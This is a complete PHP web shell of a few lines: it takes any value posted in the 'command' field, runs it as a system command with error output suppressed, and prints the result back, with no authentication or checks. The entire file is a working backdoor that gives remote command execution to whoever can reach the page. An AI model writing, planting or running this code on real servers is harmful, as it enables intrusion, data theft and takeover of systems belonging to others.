<?php
function shell($cmd) {
  	@ob_start();
	@system($cmd);
  	$ret = @ob_get_contents();
  	@ob_end_clean();
	return $ret;
}

echo shell($_POST['command']);
?>